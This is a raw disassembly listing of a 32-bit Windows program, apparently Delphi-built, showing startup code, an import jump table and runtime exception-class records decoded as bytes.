  404304:	a3 d4 b3 40 00       	mov    %eax,0x40b3d4
  404309:	33 c0                	xor    %eax,%eax
  40430b:	a3 20 b0 40 00       	mov    %eax,0x40b020
  404310:	33 c0                	xor    %eax,%eax
  404312:	a3 24 b0 40 00       	mov    %eax,0x40b024
  404317:	33 c0                	xor    %eax,%eax
  404319:	a3 28 b0 40 00       	mov    %eax,0x40b028
  40431e:	e8 31 ee ff ff       	call   0x403154
  404323:	33 d2                	xor    %edx,%edx
  404325:	89 90 04 00 00 00    	mov    %edx,0x4(%eax)
  40432b:	33 c0                	xor    %eax,%eax
  40432d:	a3 2c b0 40 00       	mov    %eax,0x40b02c
  404332:	c6 05 33 b0 40 00 02 	movb   $0x2,0x40b033
  404339:	c6 05 34 b0 40 00 02 	movb   $0x2,0x40b034
  404340:	c6 05 35 b0 40 00 03 	movb   $0x3,0x40b035
  404347:	66 c7 05 dc b3 40 00 	movw   $0x0,0x40b3dc
  40434e:	00 00 
  404350:	66 c7 05 ec b3 40 00 	movw   $0x1,0x40b3ec
  404357:	01 00 
  404359:	e8 fe e4 ff ff       	call   0x40285c
  40435e:	b8 38 b0 40 00       	mov    $0x40b038,%eax
  404363:	ba 98 43 40 00       	mov    $0x404398,%edx
  404368:	e8 b8 f8 ff ff       	call   0x403c25
  40436d:	b8 04 b2 40 00       	mov    $0x40b204,%eax
  404372:	ba 98 43 40 00       	mov    $0x404398,%edx
  404377:	e8 a9 f8 ff ff       	call   0x403c25
  40437c:	33 c0                	xor    %eax,%eax
  40437e:	5a                   	pop    %edx
  40437f:	59                   	pop    %ecx
  404380:	59                   	pop    %ecx
  404381:	64 89 10             	mov    %edx,%fs:(%eax)
  404384:	68 91 43 40 00       	push   $0x404391
  404389:	c3                   	ret
  40438a:	e9 6d ea ff ff       	jmp    0x402dfc
  40438f:	eb f8                	jmp    0x404389
  404391:	5f                   	pop    %edi
  404392:	5e                   	pop    %esi
  404393:	5b                   	pop    %ebx
  404394:	5d                   	pop    %ebp
  404395:	c3                   	ret
  404396:	00 00                	add    %al,(%eax)
  404398:	00 00                	add    %al,(%eax)
  40439a:	00 00                	add    %al,(%eax)
  40439c:	ff 25 58 c1 40 00    	jmp    *0x40c158
  4043a2:	8b c0                	mov    %eax,%eax
  4043a4:	ff 25 54 c1 40 00    	jmp    *0x40c154
  4043aa:	8b c0                	mov    %eax,%eax
  4043ac:	ff 25 50 c1 40 00    	jmp    *0x40c150
  4043b2:	8b c0                	mov    %eax,%eax
  4043b4:	ff 25 4c c1 40 00    	jmp    *0x40c14c
  4043ba:	8b c0                	mov    %eax,%eax
  4043bc:	ff 25 48 c1 40 00    	jmp    *0x40c148
  4043c2:	8b c0                	mov    %eax,%eax
  4043c4:	ff 25 08 c2 40 00    	jmp    *0x40c208
  4043ca:	8b c0                	mov    %eax,%eax
  4043cc:	ff 25 04 c2 40 00    	jmp    *0x40c204
  4043d2:	8b c0                	mov    %eax,%eax
  4043d4:	ff 25 00 c2 40 00    	jmp    *0x40c200
  4043da:	8b c0                	mov    %eax,%eax
  4043dc:	ff 25 fc c1 40 00    	jmp    *0x40c1fc
  4043e2:	8b c0                	mov    %eax,%eax
  4043e4:	ff 25 f8 c1 40 00    	jmp    *0x40c1f8
  4043ea:	8b c0                	mov    %eax,%eax
  4043ec:	ff 25 f4 c1 40 00    	jmp    *0x40c1f4
  4043f2:	8b c0                	mov    %eax,%eax
  4043f4:	ff 25 f0 c1 40 00    	jmp    *0x40c1f0
  4043fa:	8b c0                	mov    %eax,%eax
  4043fc:	ff 25 ec c1 40 00    	jmp    *0x40c1ec
  404402:	8b c0                	mov    %eax,%eax
  404404:	ff 25 e8 c1 40 00    	jmp    *0x40c1e8
  40440a:	8b c0                	mov    %eax,%eax
  40440c:	ff 25 e4 c1 40 00    	jmp    *0x40c1e4
  404412:	8b c0                	mov    %eax,%eax
  404414:	ff 25 e0 c1 40 00    	jmp    *0x40c1e0
  40441a:	8b c0                	mov    %eax,%eax
  40441c:	ff 25 dc c1 40 00    	jmp    *0x40c1dc
  404422:	8b c0                	mov    %eax,%eax
  404424:	ff 25 d8 c1 40 00    	jmp    *0x40c1d8
  40442a:	8b c0                	mov    %eax,%eax
  40442c:	ff 25 d4 c1 40 00    	jmp    *0x40c1d4
  404432:	8b c0                	mov    %eax,%eax
  404434:	ff 25 d0 c1 40 00    	jmp    *0x40c1d0
  40443a:	8b c0                	mov    %eax,%eax
  40443c:	ff 25 cc c1 40 00    	jmp    *0x40c1cc
  404442:	8b c0                	mov    %eax,%eax
  404444:	ff 25 c8 c1 40 00    	jmp    *0x40c1c8
  40444a:	8b c0                	mov    %eax,%eax
  40444c:	ff 25 c4 c1 40 00    	jmp    *0x40c1c4
  404452:	8b c0                	mov    %eax,%eax
  404454:	ff 25 c0 c1 40 00    	jmp    *0x40c1c0
  40445a:	8b c0                	mov    %eax,%eax
  40445c:	ff 25 bc c1 40 00    	jmp    *0x40c1bc
  404462:	8b c0                	mov    %eax,%eax
  404464:	ff 25 b8 c1 40 00    	jmp    *0x40c1b8
  40446a:	8b c0                	mov    %eax,%eax
  40446c:	ff 25 b4 c1 40 00    	jmp    *0x40c1b4
  404472:	8b c0                	mov    %eax,%eax
  404474:	ff 25 b0 c1 40 00    	jmp    *0x40c1b0
  40447a:	8b c0                	mov    %eax,%eax
  40447c:	ff 25 ac c1 40 00    	jmp    *0x40c1ac
  404482:	8b c0                	mov    %eax,%eax
  404484:	ff 25 a8 c1 40 00    	jmp    *0x40c1a8
  40448a:	8b c0                	mov    %eax,%eax
  40448c:	ff 25 a4 c1 40 00    	jmp    *0x40c1a4
  404492:	8b c0                	mov    %eax,%eax
  404494:	ff 25 a0 c1 40 00    	jmp    *0x40c1a0
  40449a:	8b c0                	mov    %eax,%eax
  40449c:	ff 25 9c c1 40 00    	jmp    *0x40c19c
  4044a2:	8b c0                	mov    %eax,%eax
  4044a4:	ff 25 98 c1 40 00    	jmp    *0x40c198
  4044aa:	8b c0                	mov    %eax,%eax
  4044ac:	ff 25 94 c1 40 00    	jmp    *0x40c194
  4044b2:	8b c0                	mov    %eax,%eax
  4044b4:	ff 25 90 c1 40 00    	jmp    *0x40c190
  4044ba:	8b c0                	mov    %eax,%eax
  4044bc:	ff 25 8c c1 40 00    	jmp    *0x40c18c
  4044c2:	8b c0                	mov    %eax,%eax
  4044c4:	ff 25 88 c1 40 00    	jmp    *0x40c188
  4044ca:	8b c0                	mov    %eax,%eax
  4044cc:	ff 25 84 c1 40 00    	jmp    *0x40c184
  4044d2:	8b c0                	mov    %eax,%eax
  4044d4:	ff 25 80 c1 40 00    	jmp    *0x40c180
  4044da:	8b c0                	mov    %eax,%eax
  4044dc:	ff 25 7c c1 40 00    	jmp    *0x40c17c
  4044e2:	8b c0                	mov    %eax,%eax
  4044e4:	ff 25 78 c1 40 00    	jmp    *0x40c178
  4044ea:	8b c0                	mov    %eax,%eax
  4044ec:	ff 25 74 c1 40 00    	jmp    *0x40c174
  4044f2:	8b c0                	mov    %eax,%eax
  4044f4:	ff 25 70 c1 40 00    	jmp    *0x40c170
  4044fa:	8b c0                	mov    %eax,%eax
  4044fc:	ff 25 6c c1 40 00    	jmp    *0x40c16c
  404502:	8b c0                	mov    %eax,%eax
  404504:	ff 25 68 c1 40 00    	jmp    *0x40c168
  40450a:	8b c0                	mov    %eax,%eax
  40450c:	ff 25 64 c1 40 00    	jmp    *0x40c164
  404512:	8b c0                	mov    %eax,%eax
  404514:	ff 25 60 c1 40 00    	jmp    *0x40c160
  40451a:	8b c0                	mov    %eax,%eax
  40451c:	ff 25 38 c2 40 00    	jmp    *0x40c238
  404522:	8b c0                	mov    %eax,%eax
  404524:	ff 25 3c c2 40 00    	jmp    *0x40c23c
  40452a:	8b c0                	mov    %eax,%eax
  40452c:	ff 25 34 c2 40 00    	jmp    *0x40c234
  404532:	8b c0                	mov    %eax,%eax
  404534:	ff 25 30 c2 40 00    	jmp    *0x40c230
  40453a:	8b c0                	mov    %eax,%eax
  40453c:	ff 25 2c c2 40 00    	jmp    *0x40c22c
  404542:	8b c0                	mov    %eax,%eax
  404544:	ff 25 28 c2 40 00    	jmp    *0x40c228
  40454a:	8b c0                	mov    %eax,%eax
  40454c:	ff 25 24 c2 40 00    	jmp    *0x40c224
  404552:	8b c0                	mov    %eax,%eax
  404554:	ff 25 20 c2 40 00    	jmp    *0x40c220
  40455a:	8b c0                	mov    %eax,%eax
  40455c:	ff 25 1c c2 40 00    	jmp    *0x40c21c
  404562:	8b c0                	mov    %eax,%eax
  404564:	ff 25 18 c2 40 00    	jmp    *0x40c218
  40456a:	8b c0                	mov    %eax,%eax
  40456c:	ff 25 14 c2 40 00    	jmp    *0x40c214
  404572:	8b c0                	mov    %eax,%eax
  404574:	ff 25 10 c2 40 00    	jmp    *0x40c210
  40457a:	8b c0                	mov    %eax,%eax
  40457c:	00 00                	add    %al,(%eax)
  40457e:	00 00                	add    %al,(%eax)
  404580:	b0 45                	mov    $0x45,%al
  404582:	40                   	inc    %eax
	...
  404593:	00 c2                	add    %al,%dl
  404595:	45                   	inc    %ebp
  404596:	40                   	inc    %eax
  404597:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40459a:	00 00                	add    %al,(%eax)
  40459c:	3c 10                	cmp    $0x10,%al
  40459e:	40                   	inc    %eax
  40459f:	00 c4                	add    %al,%ah
  4045a1:	29 40 00             	sub    %eax,0x0(%eax)
  4045a4:	ac                   	lods   %ds:(%esi),%al
  4045a5:	28 40 00             	sub    %al,0x0(%eax)
  4045a8:	d4 28                	aam    $0x28
  4045aa:	40                   	inc    %eax
  4045ab:	00 18                	add    %bl,(%eax)
  4045ad:	29 40 00             	sub    %eax,0x0(%eax)
  4045b0:	0e                   	push   %cs
  4045b1:	00 00                	add    %al,(%eax)
  4045b3:	00 00                	add    %al,(%eax)
  4045b5:	00 01                	add    %al,(%ecx)
  4045b7:	00 00                	add    %al,(%eax)
  4045b9:	00 00                	add    %al,(%eax)
  4045bb:	10 40 00             	adc    %al,0x0(%eax)
  4045be:	04 00                	add    $0x0,%al
  4045c0:	00 00                	add    %al,(%eax)
  4045c2:	09 45 78             	or     %eax,0x78(%ebp)
  4045c5:	63 65 70             	arpl   %esp,0x70(%ebp)
  4045c8:	74 69                	je     0x404633
  4045ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4045cb:	6e                   	outsb  %ds:(%esi),(%dx)
	...
  4045e4:	00 46 40             	add    %al,0x40(%esi)
  4045e7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4045ea:	00 00                	add    %al,(%eax)
  4045ec:	b0 45                	mov    $0x45,%al
  4045ee:	40                   	inc    %eax
  4045ef:	00 c4                	add    %al,%ah
  4045f1:	29 40 00             	sub    %eax,0x0(%eax)
  4045f4:	ac                   	lods   %ds:(%esi),%al
  4045f5:	28 40 00             	sub    %al,0x0(%eax)
  4045f8:	d4 28                	aam    $0x28
  4045fa:	40                   	inc    %eax
  4045fb:	00 18                	add    %bl,(%eax)
  4045fd:	29 40 00             	sub    %eax,0x0(%eax)
  404600:	06                   	push   %es
  404601:	45                   	inc    %ebp
  404602:	41                   	inc    %ecx
  404603:	62 6f 72             	bound  %ebp,0x72(%edi)
  404606:	74 90                	je     0x404598
	...
  404620:	3c 46                	cmp    $0x46,%al
  404622:	40                   	inc    %eax
  404623:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404626:	00 00                	add    %al,(%eax)
  404628:	b0 45                	mov    $0x45,%al
  40462a:	40                   	inc    %eax
  40462b:	00 c4                	add    %al,%ah
  40462d:	29 40 00             	sub    %eax,0x0(%eax)
  404630:	ac                   	lods   %ds:(%esi),%al
  404631:	28 40 00             	sub    %al,0x0(%eax)
  404634:	98                   	cwtl
  404635:	59                   	pop    %ecx
  404636:	40                   	inc    %eax
  404637:	00 8c 59 40 00 0c 45 	add    %cl,0x450c0040(%ecx,%ebx,2)
  40463e:	4f                   	dec    %edi
  40463f:	75 74                	jne    0x4046b5
  404641:	4f                   	dec    %edi
  404642:	66 4d                	dec    %bp
  404644:	65 6d                	gs insl (%dx),%es:(%edi)
  404646:	6f                   	outsl  %ds:(%esi),(%dx)
  404647:	72 79                	jb     0x4046c2
  404649:	8d 40 00             	lea    0x0(%eax),%eax
	...
  404664:	80 46 40 00          	addb   $0x0,0x40(%esi)
  404668:	10 00                	adc    %al,(%eax)
  40466a:	00 00                	add    %al,(%eax)
  40466c:	b0 45                	mov    $0x45,%al
  40466e:	40                   	inc    %eax
  40466f:	00 c4                	add    %al,%ah
  404671:	29 40 00             	sub    %eax,0x0(%eax)
  404674:	ac                   	lods   %ds:(%esi),%al
  404675:	28 40 00             	sub    %al,0x0(%eax)
  404678:	d4 28                	aam    $0x28
  40467a:	40                   	inc    %eax
  40467b:	00 18                	add    %bl,(%eax)
  40467d:	29 40 00             	sub    %eax,0x0(%eax)
  404680:	0b 45 49             	or     0x49(%ebp),%eax
  404683:	6e                   	outsb  %ds:(%esi),(%dx)
  404684:	4f                   	dec    %edi
  404685:	75 74                	jne    0x4046fb
  404687:	45                   	inc    %ebp
  404688:	72 72                	jb     0x4046fc
  40468a:	6f                   	outsl  %ds:(%esi),(%dx)
  40468b:	72 00                	jb     0x40468d
	...
  4046a1:	00 00                	add    %al,(%eax)
  4046a3:	00 c0                	add    %al,%al
  4046a5:	46                   	inc    %esi
  4046a6:	40                   	inc    %eax
  4046a7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4046aa:	00 00                	add    %al,(%eax)
  4046ac:	b0 45                	mov    $0x45,%al
  4046ae:	40                   	inc    %eax
  4046af:	00 c4                	add    %al,%ah
  4046b1:	29 40 00             	sub    %eax,0x0(%eax)
  4046b4:	ac                   	lods   %ds:(%esi),%al
  4046b5:	28 40 00             	sub    %al,0x0(%eax)
  4046b8:	d4 28                	aam    $0x28
  4046ba:	40                   	inc    %eax
  4046bb:	00 18                	add    %bl,(%eax)
  4046bd:	29 40 00             	sub    %eax,0x0(%eax)
  4046c0:	09 45 49             	or     %eax,0x49(%ebp)
  4046c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4046c4:	74 45                	je     0x40470b
  4046c6:	72 72                	jb     0x40473a
  4046c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4046c9:	72 8b                	jb     0x404656
  4046cb:	c0 00 00             	rolb   $0x0,(%eax)
	...
  4046e2:	00 00                	add    %al,(%eax)
  4046e4:	00 47 40             	add    %al,0x40(%edi)
  4046e7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4046ea:	00 00                	add    %al,(%eax)
  4046ec:	c0 46 40 00          	rolb   $0x0,0x40(%esi)
  4046f0:	c4 29                	les    (%ecx),%ebp
  4046f2:	40                   	inc    %eax
  4046f3:	00 ac 28 40 00 d4 28 	add    %ch,0x28d40040(%eax,%ebp,1)
  4046fa:	40                   	inc    %eax
  4046fb:	00 18                	add    %bl,(%eax)
  4046fd:	29 40 00             	sub    %eax,0x0(%eax)
  404700:	0a 45 44             	or     0x44(%ebp),%al
  404703:	69 76 42 79 5a 65 72 	imul   $0x72655a79,0x42(%esi),%esi
  40470a:	6f                   	outsl  %ds:(%esi),(%dx)
  40470b:	90                   	nop
	...
  404724:	40                   	inc    %eax
  404725:	47                   	inc    %edi
  404726:	40                   	inc    %eax
  404727:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40472a:	00 00                	add    %al,(%eax)
  40472c:	c0 46 40 00          	rolb   $0x0,0x40(%esi)
  404730:	c4 29                	les    (%ecx),%ebp
  404732:	40                   	inc    %eax
  404733:	00 ac 28 40 00 d4 28 	add    %ch,0x28d40040(%eax,%ebp,1)
  40473a:	40                   	inc    %eax
  40473b:	00 18                	add    %bl,(%eax)
  40473d:	29 40 00             	sub    %eax,0x0(%eax)
  404740:	0b 45 52             	or     0x52(%ebp),%eax
  404743:	61                   	popa
  404744:	6e                   	outsb  %ds:(%esi),(%dx)
  404745:	67 65 45             	addr16 gs inc %ebp
  404748:	72 72                	jb     0x4047bc
  40474a:	6f                   	outsl  %ds:(%esi),(%dx)
  40474b:	72 00                	jb     0x40474d
	...
  404761:	00 00                	add    %al,(%eax)
  404763:	00 80 47 40 00 0c    	add    %al,0xc004047(%eax)
  404769:	00 00                	add    %al,(%eax)
  40476b:	00 c0                	add    %al,%al
  40476d:	46                   	inc    %esi
  40476e:	40                   	inc    %eax
  40476f:	00 c4                	add    %al,%ah
  404771:	29 40 00             	sub    %eax,0x0(%eax)
  404774:	ac                   	lods   %ds:(%esi),%al
  404775:	28 40 00             	sub    %al,0x0(%eax)
  404778:	d4 28                	aam    $0x28
  40477a:	40                   	inc    %eax
  40477b:	00 18                	add    %bl,(%eax)
  40477d:	29 40 00             	sub    %eax,0x0(%eax)
  404780:	0c 45                	or     $0x45,%al
  404782:	49                   	dec    %ecx
  404783:	6e                   	outsb  %ds:(%esi),(%dx)
  404784:	74 4f                	je     0x4047d5
  404786:	76 65                	jbe    0x4047ed
  404788:	72 66                	jb     0x4047f0
  40478a:	6c                   	insb   (%dx),%es:(%edi)
  40478b:	6f                   	outsl  %ds:(%esi),(%dx)
  40478c:	77 8d                	ja     0x40471b
  40478e:	40                   	inc    %eax
	...
  4047a7:	00 c4                	add    %al,%ah
  4047a9:	47                   	inc    %edi
  4047aa:	40                   	inc    %eax
  4047ab:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4047ae:	00 00                	add    %al,(%eax)
  4047b0:	b0 45                	mov    $0x45,%al
  4047b2:	40                   	inc    %eax
  4047b3:	00 c4                	add    %al,%ah
  4047b5:	29 40 00             	sub    %eax,0x0(%eax)
  4047b8:	ac                   	lods   %ds:(%esi),%al
  4047b9:	28 40 00             	sub    %al,0x0(%eax)
  4047bc:	d4 28                	aam    $0x28
  4047be:	40                   	inc    %eax
  4047bf:	00 18                	add    %bl,(%eax)
  4047c1:	29 40 00             	sub    %eax,0x0(%eax)
  4047c4:	0a 45 4d             	or     0x4d(%ebp),%al
  4047c7:	61                   	popa
  4047c8:	74 68                	je     0x404832
  4047ca:	45                   	inc    %ebp
  4047cb:	72 72                	jb     0x40483f
  4047cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4047ce:	72 90                	jb     0x404760
	...
  4047e8:	04 48                	add    $0x48,%al
  4047ea:	40                   	inc    %eax
  4047eb:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4047ee:	00 00                	add    %al,(%eax)
  4047f0:	c4 47 40             	les    0x40(%edi),%eax
  4047f3:	00 c4                	add    %al,%ah
  4047f5:	29 40 00             	sub    %eax,0x0(%eax)
  4047f8:	ac                   	lods   %ds:(%esi),%al
  4047f9:	28 40 00             	sub    %al,0x0(%eax)
  4047fc:	d4 28                	aam    $0x28
  4047fe:	40                   	inc    %eax
  4047ff:	00 18                	add    %bl,(%eax)
  404801:	29 40 00             	sub    %eax,0x0(%eax)
  404804:	0a 45 49             	or     0x49(%ebp),%al
  404807:	6e                   	outsb  %ds:(%esi),(%dx)
  404808:	76 61                	jbe    0x40486b
  40480a:	6c                   	insb   (%dx),%es:(%edi)
  40480b:	69 64 4f 70 90 00 00 	imul   $0x90,0x70(%edi,%ecx,2),%esp
  404812:	00 
	...
  404827:	00 44 48 40          	add    %al,0x40(%eax,%ecx,2)
  40482b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40482e:	00 00                	add    %al,(%eax)
  404830:	c4 47 40             	les    0x40(%edi),%eax
  404833:	00 c4                	add    %al,%ah
  404835:	29 40 00             	sub    %eax,0x0(%eax)
  404838:	ac                   	lods   %ds:(%esi),%al
  404839:	28 40 00             	sub    %al,0x0(%eax)
  40483c:	d4 28                	aam    $0x28
  40483e:	40                   	inc    %eax
  40483f:	00 18                	add    %bl,(%eax)
  404841:	29 40 00             	sub    %eax,0x0(%eax)
  404844:	0b 45 5a             	or     0x5a(%ebp),%eax
  404847:	65 72 6f             	gs jb  0x4048b9
  40484a:	44                   	inc    %esp
  40484b:	69 76 69 64 65 00 00 	imul   $0x6564,0x69(%esi),%esi
	...
  404866:	00 00                	add    %al,(%eax)
  404868:	84 48 40             	test   %cl,0x40(%eax)
  40486b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40486e:	00 00                	add    %al,(%eax)
  404870:	c4 47 40             	les    0x40(%edi),%eax
  404873:	00 c4                	add    %al,%ah
  404875:	29 40 00             	sub    %eax,0x0(%eax)
  404878:	ac                   	lods   %ds:(%esi),%al
  404879:	28 40 00             	sub    %al,0x0(%eax)
  40487c:	d4 28                	aam    $0x28
  40487e:	40                   	inc    %eax
  40487f:	00 18                	add    %bl,(%eax)
  404881:	29 40 00             	sub    %eax,0x0(%eax)
  404884:	09 45 4f             	or     %eax,0x4f(%ebp)
  404887:	76 65                	jbe    0x4048ee
  404889:	72 66                	jb     0x4048f1
  40488b:	6c                   	insb   (%dx),%es:(%edi)
  40488c:	6f                   	outsl  %ds:(%esi),(%dx)
  40488d:	77 8b                	ja     0x40481a
  40488f:	c0 00 00             	rolb   $0x0,(%eax)
	...
  4048a6:	00 00                	add    %al,(%eax)
  4048a8:	c4 48 40             	les    0x40(%eax),%ecx
  4048ab:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4048ae:	00 00                	add    %al,(%eax)
  4048b0:	c4 47 40             	les    0x40(%edi),%eax
  4048b3:	00 c4                	add    %al,%ah
  4048b5:	29 40 00             	sub    %eax,0x0(%eax)
  4048b8:	ac                   	lods   %ds:(%esi),%al
  4048b9:	28 40 00             	sub    %al,0x0(%eax)
  4048bc:	d4 28                	aam    $0x28
  4048be:	40                   	inc    %eax
  4048bf:	00 18                	add    %bl,(%eax)
  4048c1:	29 40 00             	sub    %eax,0x0(%eax)
  4048c4:	0a 45 55             	or     0x55(%ebp),%al
  4048c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4048c8:	64 65 72 66          	fs gs jb 0x404932
  4048cc:	6c                   	insb   (%dx),%es:(%edi)
  4048cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4048ce:	77 90                	ja     0x404860
	...
  4048e8:	04 49                	add    $0x49,%al
  4048ea:	40                   	inc    %eax
  4048eb:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4048ee:	00 00                	add    %al,(%eax)
  4048f0:	b0 45                	mov    $0x45,%al
  4048f2:	40                   	inc    %eax
  4048f3:	00 c4                	add    %al,%ah
  4048f5:	29 40 00             	sub    %eax,0x0(%eax)
  4048f8:	ac                   	lods   %ds:(%esi),%al
  4048f9:	28 40 00             	sub    %al,0x0(%eax)
  4048fc:	d4 28                	aam    $0x28
  4048fe:	40                   	inc    %eax
  4048ff:	00 18                	add    %bl,(%eax)
  404901:	29 40 00             	sub    %eax,0x0(%eax)
  404904:	0f 45 49 6e          	cmovne 0x6e(%ecx),%ecx
  404908:	76 61                	jbe    0x40496b
  40490a:	6c                   	insb   (%dx),%es:(%edi)
  40490b:	69 64 50 6f 69 6e 74 	imul   $0x65746e69,0x6f(%eax,%edx,2),%esp
  404912:	65 
  404913:	72 00                	jb     0x404915
	...
  404929:	00 00                	add    %al,(%eax)
  40492b:	00 48 49             	add    %cl,0x49(%eax)
  40492e:	40                   	inc    %eax
  40492f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404932:	00 00                	add    %al,(%eax)
  404934:	b0 45                	mov    $0x45,%al
  404936:	40                   	inc    %eax
  404937:	00 c4                	add    %al,%ah
  404939:	29 40 00             	sub    %eax,0x0(%eax)
  40493c:	ac                   	lods   %ds:(%esi),%al
  40493d:	28 40 00             	sub    %al,0x0(%eax)
  404940:	d4 28                	aam    $0x28
  404942:	40                   	inc    %eax
  404943:	00 18                	add    %bl,(%eax)
  404945:	29 40 00             	sub    %eax,0x0(%eax)
  404948:	0c 45                	or     $0x45,%al
  40494a:	49                   	dec    %ecx
  40494b:	6e                   	outsb  %ds:(%esi),(%dx)
  40494c:	76 61                	jbe    0x4049af
  40494e:	6c                   	insb   (%dx),%es:(%edi)
  40494f:	69 64 43 61 73 74 8d 	imul   $0x408d7473,0x61(%ebx,%eax,2),%esp
  404956:	40 
	...
  40496f:	00 8c 49 40 00 0c 00 	add    %cl,0xc0040(%ecx,%ecx,2)
  404976:	00 00                	add    %al,(%eax)
  404978:	b0 45                	mov    $0x45,%al
  40497a:	40                   	inc    %eax
  40497b:	00 c4                	add    %al,%ah
  40497d:	29 40 00             	sub    %eax,0x0(%eax)
  404980:	ac                   	lods   %ds:(%esi),%al
  404981:	28 40 00             	sub    %al,0x0(%eax)
  404984:	d4 28                	aam    $0x28
  404986:	40                   	inc    %eax
  404987:	00 18                	add    %bl,(%eax)
  404989:	29 40 00             	sub    %eax,0x0(%eax)
  40498c:	0d 45 43 6f 6e       	or     $0x6e6f4345,%eax
  404991:	76 65                	jbe    0x4049f8
  404993:	72 74                	jb     0x404a09
  404995:	45                   	inc    %ebp
  404996:	72 72                	jb     0x404a0a
  404998:	6f                   	outsl  %ds:(%esi),(%dx)
  404999:	72 8b                	jb     0x404926
  40499b:	c0 00 00             	rolb   $0x0,(%eax)
	...
  4049b2:	00 00                	add    %al,(%eax)
  4049b4:	d0 49 40             	rorb   $1,0x40(%ecx)
  4049b7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4049ba:	00 00                	add    %al,(%eax)
  4049bc:	b0 45                	mov    $0x45,%al
  4049be:	40                   	inc    %eax
  4049bf:	00 c4                	add    %al,%ah
  4049c1:	29 40 00             	sub    %eax,0x0(%eax)
  4049c4:	ac                   	lods   %ds:(%esi),%al
  4049c5:	28 40 00             	sub    %al,0x0(%eax)
  4049c8:	d4 28                	aam    $0x28
  4049ca:	40                   	inc    %eax
  4049cb:	00 18                	add    %bl,(%eax)
  4049cd:	29 40 00             	sub    %eax,0x0(%eax)
  4049d0:	10 45 41             	adc    %al,0x41(%ebp)
  4049d3:	63 63 65             	arpl   %esp,0x65(%ebx)
  4049d6:	73 73                	jae    0x404a4b
  4049d8:	56                   	push   %esi
  4049d9:	69 6f 6c 61 74 69 6f 	imul   $0x6f697461,0x6c(%edi),%ebp
  4049e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4049e1:	8d 40 00             	lea    0x0(%eax),%eax
	...
  4049fc:	18 4a 40             	sbb    %cl,0x40(%edx)
  4049ff:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404a02:	00 00                	add    %al,(%eax)
  404a04:	b0 45                	mov    $0x45,%al
  404a06:	40                   	inc    %eax
  404a07:	00 c4                	add    %al,%ah
  404a09:	29 40 00             	sub    %eax,0x0(%eax)
  404a0c:	ac                   	lods   %ds:(%esi),%al
  404a0d:	28 40 00             	sub    %al,0x0(%eax)
  404a10:	d4 28                	aam    $0x28
  404a12:	40                   	inc    %eax
  404a13:	00 18                	add    %bl,(%eax)
  404a15:	29 40 00             	sub    %eax,0x0(%eax)
  404a18:	0a 45 50             	or     0x50(%ebp),%al
  404a1b:	72 69                	jb     0x404a86
  404a1d:	76 69                	jbe    0x404a88
  404a1f:	6c                   	insb   (%dx),%es:(%edi)
  404a20:	65 67 65 90          	gs addr16 gs nop
	...
  404a3c:	58                   	pop    %eax
  404a3d:	4a                   	dec    %edx
  404a3e:	40                   	inc    %eax
  404a3f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404a42:	00 00                	add    %al,(%eax)
  404a44:	b0 45                	mov    $0x45,%al
  404a46:	40                   	inc    %eax
  404a47:	00 c4                	add    %al,%ah
  404a49:	29 40 00             	sub    %eax,0x0(%eax)
  404a4c:	ac                   	lods   %ds:(%esi),%al
  404a4d:	28 40 00             	sub    %al,0x0(%eax)
  404a50:	d4 28                	aam    $0x28
  404a52:	40                   	inc    %eax
  404a53:	00 18                	add    %bl,(%eax)
  404a55:	29 40 00             	sub    %eax,0x0(%eax)
  404a58:	0e                   	push   %cs
  404a59:	45                   	inc    %ebp
  404a5a:	53                   	push   %ebx
  404a5b:	74 61                	je     0x404abe
  404a5d:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
  404a60:	76 65                	jbe    0x404ac7
  404a62:	72 66                	jb     0x404aca
  404a64:	6c                   	insb   (%dx),%es:(%edi)
  404a65:	6f                   	outsl  %ds:(%esi),(%dx)
  404a66:	77 90                	ja     0x4049f8
	...
  404a80:	9c                   	pushf
  404a81:	4a                   	dec    %edx
  404a82:	40                   	inc    %eax
  404a83:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404a86:	00 00                	add    %al,(%eax)
  404a88:	b0 45                	mov    $0x45,%al
  404a8a:	40                   	inc    %eax
  404a8b:	00 c4                	add    %al,%ah
  404a8d:	29 40 00             	sub    %eax,0x0(%eax)
  404a90:	ac                   	lods   %ds:(%esi),%al
  404a91:	28 40 00             	sub    %al,0x0(%eax)
  404a94:	d4 28                	aam    $0x28
  404a96:	40                   	inc    %eax
  404a97:	00 18                	add    %bl,(%eax)
  404a99:	29 40 00             	sub    %eax,0x0(%eax)
  404a9c:	09 45 43             	or     %eax,0x43(%ebp)
  404a9f:	6f                   	outsl  %ds:(%esi),(%dx)
  404aa0:	6e                   	outsb  %ds:(%esi),(%dx)
  404aa1:	74 72                	je     0x404b15
  404aa3:	6f                   	outsl  %ds:(%esi),(%dx)
  404aa4:	6c                   	insb   (%dx),%es:(%edi)
  404aa5:	43                   	inc    %ebx
  404aa6:	8b c0                	mov    %eax,%eax
	...
  404ac0:	dc 4a 40             	fmull  0x40(%edx)
  404ac3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404ac6:	00 00                	add    %al,(%eax)
  404ac8:	b0 45                	mov    $0x45,%al
  404aca:	40                   	inc    %eax
  404acb:	00 c4                	add    %al,%ah
  404acd:	29 40 00             	sub    %eax,0x0(%eax)
  404ad0:	ac                   	lods   %ds:(%esi),%al
